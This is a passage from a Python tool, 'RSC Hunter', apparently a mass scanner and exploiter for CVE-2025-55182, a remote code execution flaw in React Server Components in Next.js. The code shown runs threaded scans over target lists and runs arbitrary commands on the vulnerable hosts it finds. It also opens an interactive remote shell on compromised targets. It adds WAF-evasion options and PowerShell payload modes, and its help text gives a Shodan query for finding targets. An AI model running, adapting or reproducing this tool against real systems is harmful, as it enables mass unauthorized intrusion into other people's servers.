            # Submit all tasks
            futureToUrl = {
                executor.submit(self.scanner.scanUrl, url): url 
                for url in pending
            }
            
            # Process completed tasks
            for future in as_completed(futureToUrl):
                if self.stopScan:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                url = futureToUrl[future]
                
                try:
                    result = future.result()
                    
                    # Execute command if vulnerable
                    if result.vulnerable and self.execCommand:
                        result.execOutput = self.executeRemoteCommand(result.url, None)
                    
                    results.append(result)
                    completed.add(url)
                    
                    # Update live shell with new vulnerable target
                    if result.vulnerable and liveShell:
                        liveShell.addVulnerableTarget(result.url)
                    
                    # Print result (skip clean targets in shell mode)
                    if not liveShell or result.vulnerable or result.error:
                        self._printResult(result, len(completed), total)
                    
                    # Save state periodically (every 10 scans)
                    if len(completed) % 10 == 0:
                        self.stateManager.saveState(targets, completed, results, scanId)
                    
                    # Handle pause
                    while self.paused and not self.stopScan:
                        time.sleep(0.5)
                    
                except Exception as e:
                    print(f"{Colors.RED}✗ {UrlParser.extractDomain(url)}: Error - {str(e)[:50]}{Colors.RESET}")
        
        # Final state save
        self.stateManager.saveState(targets, completed, results, scanId)
        
        # Print summary
        elapsed = time.time() - startTime
        self._printSummary(results, elapsed, scanId)
        
        return results
    
    def _printResult(self, result: ScanResult, current: int, total: int):
        """Print individual scan result"""
        domain = UrlParser.extractDomain(result.url)
        progress = f"[{current}/{total}]"
        
        if result.error:
            print(f"{Colors.YELLOW}{progress} {EMOJI_WARN} {domain}: {result.error}{Colors.RESET}")
        elif result.vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}{progress} [VULNERABLE] {domain}{Colors.RESET}")
            if result.execOutput:
                print(f"{Colors.MAGENTA}   ↳ Exec Output: {result.execOutput.splitlines()[0]}...{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}{progress} ✓ {domain}:{Colors.RESET}")
    
    def _printSummary(self, results: List[ScanResult], elapsed: float, scanId: str):
        """Print scan summary with statistics"""
        vulnerable = [r for r in results if r.vulnerable]
        errors = [r for r in results if r.error]
        clean = [r for r in results if not r.vulnerable and not r.error]
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{EMOJI_CHART} SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        print(f"⏱  Scan time: {Colors.BOLD}{elapsed:.2f}s{Colors.RESET}")
        print(f"🆔 Scan ID: {Colors.BOLD}{scanId}{Colors.RESET}")
        print(f"📈 Scan rate: {Colors.BOLD}{len(results)/elapsed:.2f} targets/sec{Colors.RESET}\n")
        
        print(f"Total scanned: {Colors.BOLD}{len(results)}{Colors.RESET}")
        print(f"{Colors.RED}💀 Vulnerable: {Colors.BOLD}{len(vulnerable)}{Colors.RESET}")
        print(f"{Colors.GREEN}👌 Clean: {Colors.BOLD}{len(clean)}{Colors.RESET}")
        print(f"{Colors.YELLOW}❗  Errors: {Colors.BOLD}{len(errors)}{Colors.RESET}\n")
        
        if vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}{EMOJI_WARN_EMOJI}  VULNERABLE TARGETS{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}\n")
            
            # Create table
            print(f"{Colors.BOLD}{'#':<4} {'Domain/URL':<40} {'Detections':<25}{Colors.RESET}")
            print(f"{Colors.RED}{'-'*70}{Colors.RESET}")
            
            for idx, result in enumerate(vulnerable, 1):
                domain = UrlParser.extractDomain(result.url)
                detections = []
                if result.passiveDetected:
                    detections.append("Passive")
                if result.activeDetected:
                    detections.append("Active")
                if result.endpointVulnerable:
                    detections.append("Endpoint")
                
                detectionStr = ", ".join(detections)
                
                print(f"{Colors.RED}{idx:<4} {domain:<40} {detectionStr:<25}{Colors.RESET}")
                
                # Print URL if different from domain
                if domain != result.url:
                    print(f"     {Colors.YELLOW}{result.url}{Colors.RESET}")
                
                if result.execOutput:
                    print(f"     {Colors.MAGENTA}Exec: {result.execOutput.replace(chr(10), ' | ')}{Colors.RESET}")
            
            print(f"\n{Colors.RED}{EMOJI_WARN}  These targets are potentially vulnerable to CVE-2025-55182{Colors.RESET}")
            print(f"{Colors.YELLOW}📝 Full results saved to: scan_state.json{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        # Clear state if scan completed successfully
        if not self.stopScan and not self.paused:
            # Keep the state file but mark as complete
            pass


def generateReport(results: List[ScanResult], filename: str = "rsc-report.txt"):
    """Generate a human-readable report"""
    vulnerable = [r for r in results if r.vulnerable]
    
    with open(filename, 'w') as f:
        f.write("="*70 + "\n")
        f.write(f"RSC VULNERABILITY SCAN REPORT\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*70 + "\n\n")
        
        f.write(f"Total Scanned: {len(results)}\n")
        f.write(f"Vulnerable:    {len(vulnerable)}\n")
        f.write("-" * 30 + "\n\n")
        
        if not vulnerable:
            f.write("No vulnerable targets found.\n")
        else:
            for idx, result in enumerate(vulnerable, 1):
                f.write(f"{idx}. {result.url}\n")
                f.write(f"   Detections: {', '.join(result.details)}\n")
                if result.execOutput:
                    f.write(f"   Command Output:\n")
                    for line in result.execOutput.splitlines():
                        f.write(f"     > {line}\n")
                f.write("\n")
    
    print(f"{Colors.GREEN}{EMOJI_FILE} Report saved to: {filename}{Colors.RESET}")


def main():
    """Main entry point"""
    
    # Check if output is a TTY
    if not sys.stdout.isatty():
        Colors.disable()
    
    # Detect Unicode support for emojis
    supportsUnicode = True
    try:
        "⚠".encode(sys.stdout.encoding or 'utf-8')
    except (UnicodeEncodeError, AttributeError):
        supportsUnicode = False
    
    # Emoji/symbol fallbacks for Windows CI
    warn = "⚠" if supportsUnicode else "[!]"
    check = "✓" if supportsUnicode else "[+]"
    bullet = "•" if supportsUnicode else "*"
    chart = "📊" if supportsUnicode else "[STATS]"
    lightning = "⚡" if supportsUnicode else "[>>]"
    file_emoji = "📄" if supportsUnicode else "[FILE]"
    shield = "🛡" if supportsUnicode else "[*]"
    pause = "⏸" if supportsUnicode else "[||]"
    warn_emoji = "⚠️" if supportsUnicode else "[!]"
    tree_branch = "├─" if supportsUnicode else "|-"
    tree_end = "└─" if supportsUnicode else "+-"
    arrow = "→" if supportsUnicode else "->"
    
    # Create comprehensive help with examples
    epilog = f"""
{Colors.CYAN}{Colors.BOLD}EXAMPLES:{Colors.RESET}
  {Colors.GREEN}Basic Scanning:{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt --threads 20{Colors.RESET}

  {Colors.GREEN}Interactive Shell Mode:{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com -sh{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt -sh --threads 15{Colors.RESET}
    
  {Colors.GREEN}Command Execution:{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt -exec "whoami"{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com -exec "id"{Colors.RESET}
    
  {Colors.GREEN}Resume & Reports:{Colors.RESET}
    {Colors.CYAN}%(prog)s --resume{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt -o custom-report.txt{Colors.RESET}
  
  {Colors.GREEN}Advanced Features:{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt --waf-bypass{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com --windows{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt --vercel-waf-bypass --threads 20{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com --no-follow-redirects{Colors.RESET}

{Colors.CYAN}{Colors.BOLD}INPUT FILE FORMAT:{Colors.RESET}
  {Colors.YELLOW}# Comments start with #{Colors.RESET}
  example.com
  https://test.example.net
  subdomain.example.org:8080
  
  {Colors.GREEN}URLs are auto-normalized (https:// added if missing){Colors.RESET}

{Colors.CYAN}{Colors.BOLD}INTERACTIVE SHELL COMMANDS:{Colors.RESET}
  {Colors.GREEN}whoami{Colors.RESET}              Execute command on current target
  {Colors.GREEN}targets{Colors.RESET}             List all vulnerable targets
  {Colors.GREEN}switch <id>{Colors.RESET}         Switch to different target
  {Colors.GREEN}info{Colors.RESET}                Show current target information
  {Colors.GREEN}refresh{Colors.RESET}             Update vulnerable targets count
  {Colors.GREEN}exit, quit{Colors.RESET}          Exit the shell

{Colors.CYAN}{Colors.BOLD}DETECTION METHODS:{Colors.RESET}
  {Colors.MAGENTA}{bullet}{Colors.RESET} Passive: Content-Type, Flight Protocol, Shodan headers
  {Colors.MAGENTA}{bullet}{Colors.RESET} Active: RSC headers, endpoint probing
  {Colors.MAGENTA}{bullet}{Colors.RESET} Error-based: REACT2SHELL_PROBE marker detection
  {Colors.MAGENTA}{bullet}{Colors.RESET} Fingerprint: __NEXT_DATA__, x-middleware-rewrite
  {Colors.MAGENTA}{bullet}{Colors.RESET} RCE Proof: X-Action-Redirect header analysis
  {Colors.MAGENTA}{bullet}{Colors.RESET} Mitigation Filter: Vercel/Netlify protection detection

{Colors.CYAN}{Colors.BOLD}ADVANCED FEATURES:{Colors.RESET}
  {Colors.GREEN}--waf-bypass{Colors.RESET}           Prepend junk data to evade WAF inspection
  {Colors.GREEN}--waf-bypass-size KB{Colors.RESET}   Customize junk data size (default: 128KB)
  {Colors.GREEN}--windows{Colors.RESET}              Use PowerShell payloads for Windows targets
  {Colors.GREEN}--vercel-waf-bypass{Colors.RESET}    Vercel-specific WAF bypass payload
  {Colors.GREEN}--follow-redirects{Colors.RESET}     Follow same-host redirects (default: on)
  {Colors.GREEN}--no-follow-redirects{Colors.RESET}  Disable redirect following
  
{Colors.CYAN}{Colors.BOLD}OUTPUT FILES:{Colors.RESET}
  {Colors.YELLOW}scan_state.json{Colors.RESET}     Resume state & full results (JSON)
  {Colors.YELLOW}rsc-report.txt{Colors.RESET}      Human-readable vulnerability report

{Colors.CYAN}{Colors.BOLD}NOTES:{Colors.RESET}
  {Colors.YELLOW}{warn}{Colors.RESET}  Scan state saved every 10 targets for resume
  {Colors.YELLOW}{warn}{Colors.RESET}  Use Ctrl+C once to pause, twice to stop
  {Colors.YELLOW}{warn}{Colors.RESET}  Shell mode filters out clean targets
  {Colors.GREEN}{check}{Colors.RESET}  Dual exploit methods with automatic fallback

{Colors.RED}{Colors.BOLD}CVE INFORMATION:{Colors.RESET}
  {Colors.RED}CVE-2025-55182:{Colors.RESET} React Server Components RCE
  {Colors.RED}Affected:{Colors.RESET} Next.js < 15.1.4, 14.2.24, 13.5.8
  {Colors.RED}Severity:{Colors.RESET} {Colors.RED}{Colors.BOLD}Critical{Colors.RESET} (Prototype Pollution {arrow} RCE)
  {Colors.YELLOW}Shodan Query:{Colors.RESET} "X-Powered-By: Next.js" "x-middleware"

{Colors.MAGENTA}{Colors.BOLD}AUTHOR & CREDITS:{Colors.RESET}
  {Colors.CYAN}{Colors.BOLD}Suman Roy{Colors.RESET} ({Colors.GREEN}@sumanrox{Colors.RESET})
  {Colors.BLUE}{tree_branch} GitHub:{Colors.RESET}  https://github.com/sumanrox
  {Colors.BLUE}{tree_end} Website:{Colors.RESET} https://sumanroy.in
  
  {Colors.YELLOW}Research Credits:{Colors.RESET}
  {Colors.GREEN}{bullet}{Colors.RESET} Security community - Real-world attack surface analysis

{Colors.BLUE}Tool Repository: https://github.com/sumanrox/rschunter{Colors.RESET}
"""
    
    parser = argparse.ArgumentParser(
        prog='rschunter.py',
        description=f'{Colors.RED}{Colors.BOLD}RSC Hunter{Colors.RESET} - Mass Vulnerability Scanner for {Colors.RED}CVE-2025-55182{Colors.RESET}\n\n'
                    f'{Colors.CYAN}High-performance scanner targeting React Server Components in Next.js applications.{Colors.RESET}\n'
                    f'{Colors.GREEN}Features multi-layered detection, dual exploit methods, and interactive shell.{Colors.RESET}',
        epilog=epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=True
    )
    
    # Input sources (mutually exclusive)
    input_group = parser.add_argument_group('Input Sources')
    input_group.add_argument(
        "input", 
        nargs="?", 
        metavar="FILE",
        help="Input file containing target URLs (one per line)"
    )
    input_group.add_argument(
        "--url", 
        metavar="URL",
        help="Single target URL or domain to scan"
    )
    input_group.add_argument(
        "--resume", 
        action="store_true",
        help="Resume from last saved state (scan_state.json)"
    )
    
    # Scanning options
    scan_group = parser.add_argument_group('Scanning Options')
    scan_group.add_argument(
        "--threads", 
        type=int, 
        default=10,
        metavar="N",
        help="Number of concurrent worker threads (default: 10, recommended: 10-20)"
    )
    scan_group.add_argument(
        "--follow-redirects",
        action="store_true",
        default=True,
        help="Follow same-host redirects (default: enabled)"
    )
    scan_group.add_argument(
        "--no-follow-redirects",
        action="store_false",
        dest="follow_redirects",
        help="Disable redirect following"
    )
    
    # Advanced options
    advanced_group = parser.add_argument_group('Advanced Options')
    advanced_group.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Enable WAF bypass mode (prepend junk data to requests)"
    )
    advanced_group.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data for WAF bypass in KB (default: 128)"
    )
    advanced_group.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payloads instead of Unix shell"
    )
    advanced_group.add_argument(
        "--vercel-waf-bypass",
        action="store_true",
        help="Use Vercel-specific WAF bypass payload variant"
    )
    
    # Exploitation options
    exploit_group = parser.add_argument_group('Exploitation Options')
    exploit_group.add_argument(
        "-sh", "--shell", 
        action="store_true",
        help="Start interactive shell on vulnerable target(s). Works with --url or file input."
    )
    exploit_group.add_argument(
        "-exec", 
        dest="execCommand",
        metavar="CMD",
        help="Execute command on all vulnerable targets. Use {} as placeholder for URL."
    )
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument(
        "-o", "--output", 
        default="rsc-report.txt",
        metavar="FILE",
        help="Output report filename (default: rsc-report.txt)"
    )
    
    args = parser.parse_args()
    
    if not args.input and not args.url and not args.resume:
        parser.print_help()
        sys.exit(1)
    
    # Auto-increase timeout for WAF bypass mode
    timeout = 20 if args.waf_bypass else 10
    
    # Print configuration if advanced features are used
    if args.waf_bypass or args.windows or args.vercel_waf_bypass or not args.follow_redirects:
        print(f"\n{Colors.CYAN}{Colors.BOLD}Advanced Configuration:{Colors.RESET}")
        if args.waf_bypass:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} WAF Bypass: Enabled ({args.waf_bypass_size}KB junk data)")
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Timeout: {timeout}s (auto-increased)")
        if args.vercel_waf_bypass:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Vercel WAF Bypass: Enabled")
        if args.windows:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Windows Mode: PowerShell payloads")
        if not args.follow_redirects:
            print(f"  {Colors.YELLOW}{warn}{Colors.RESET} Redirect Following: Disabled")
        print()
    
    try:
        scanner = MassScanner(
            maxWorkers=args.threads,
            execCommand=args.execCommand,
            wafBypass=args.waf_bypass,
            wafBypassSize=args.waf_bypass_size,
            windowsMode=args.windows,
            vercelWafBypass=args.vercel_waf_bypass,
            followRedirects=args.follow_redirects
        )
        
        if args.resume:
            # Resume from saved state
            state = scanner.stateManager.loadState()
            if not state:
                print(f"{Colors.RED}No saved state found. Start a new scan instead.{Colors.RESET}")
                sys.exit(1)
            
            targets = state['targets']
            results = scanner.scanTargets(targets, resume=True)
        elif args.url:
            # Single URL scan
            normalized = UrlParser.normalizeUrl(args.url)
            if not normalized:
                print(f"{Colors.RED}Invalid URL: {args.url}{Colors.RESET}")
                sys.exit(1)
            
            # Validate -sh flag compatibility
            if args.shell and args.execCommand:
                print(f"{Colors.YELLOW}[!] Warning: -sh and -exec flags both specified. Using interactive shell mode.{Colors.RESET}")
            
            targets = [normalized]
            results = scanner.scanTargets(targets)
            
            # Start interactive shell if requested and target is vulnerable
            if args.shell and results:
                vulnerableResults = [r for r in results if r.vulnerable]
                if vulnerableResults:
                    print(f"\n{Colors.GREEN}[+] Target is vulnerable! Starting interactive shell...{Colors.RESET}")
                    shell = InteractiveShell(normalized, scanner)
                    try:
                        shell.cmdloop()
                    except KeyboardInterrupt:
                        print(f"\n{Colors.YELLOW}Shell interrupted.{Colors.RESET}")
                else:
                    print(f"\n{Colors.YELLOW}[!] Target is not vulnerable. Cannot start shell.{Colors.RESET}")
        else:
            # File-based mass scan
            targets = scanner.loadTargets(args.input)
            
            if not targets:
                print(f"{Colors.RED}No valid targets found in {args.input}{Colors.RESET}")
                sys.exit(1)
            
            # If shell mode requested, start interactive shell in parallel with scanning
            if args.shell:
                print(f"{Colors.CYAN}[*] Starting mass scan with interactive shell mode{Colors.RESET}")
                print(f"{Colors.CYAN}[*] Shell will activate as vulnerable targets are discovered{Colors.RESET}")
                print(f"{Colors.YELLOW}[*] Clean targets will be omitted from output\n{Colors.RESET}")
                
                # Create shell with empty vulnerable list (will be populated during scan)
                shell = InteractiveShell("scanning...", scanner, vulnerableTargets=[], massMode=True)
                
                # Start scanning in background thread
                scanComplete = threading.Event()
                scanResults = []
                
                def runScan():
                    nonlocal scanResults
                    scanResults = scanner.scanTargets(targets, liveShell=shell)
                    scanComplete.set()
                
                scanThread = threading.Thread(target=runScan, daemon=True)
                scanThread.start()
                
                # Wait a moment for first results
                time.sleep(2)
                
                # Check if any vulnerable targets found
                if shell.vulnerableTargets:
                    shell.target = shell.vulnerableTargets[0]
                    shell.domain = UrlParser.extractDomain(shell.target)
                    shell._updatePrompt()
                    print(f"\n{Colors.GREEN}[+] Vulnerable target(s) found! Starting interactive shell...{Colors.RESET}")
                    print(f"{Colors.YELLOW}[*] Scanning continues in background. Use 'targets' to see updates.{Colors.RESET}\n")
                    
                    try:
                        shell.cmdloop()
                    except KeyboardInterrupt:
                        print(f"\n{Colors.YELLOW}Shell interrupted. Waiting for scan to complete...{Colors.RESET}")
                    
                    # Wait for scan to finish
                    scanComplete.wait(timeout=30)
                else:
                    print(f"{Colors.YELLOW}[*] Waiting for vulnerable targets...{Colors.RESET}")
                    scanComplete.wait()
                    if shell.vulnerableTargets:
                        shell.target = shell.vulnerableTargets[0]
                        shell.domain = UrlParser.extractDomain(shell.target)
                        shell._updatePrompt()
                        print(f"\n{Colors.GREEN}[+] Found {len(shell.vulnerableTargets)} vulnerable target(s)!{Colors.RESET}")
                        try:
                            shell.cmdloop()
                        except KeyboardInterrupt:
                            print(f"\n{Colors.YELLOW}Shell interrupted.{Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}[!] No vulnerable targets found.{Colors.RESET}")
                
                results = scanResults
            else:
                results = scanner.scanTargets(targets)
        
        # Generate report
        generateReport(results, args.output)
        
        # Exit with code 1 if vulnerabilities found
        vulnerableCount = sum(1 for r in results if r.vulnerable)
        sys.exit(1 if vulnerableCount > 0 else 0)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Scan interrupted. Run with --resume to continue.{Colors.RESET}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Colors.RED}Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
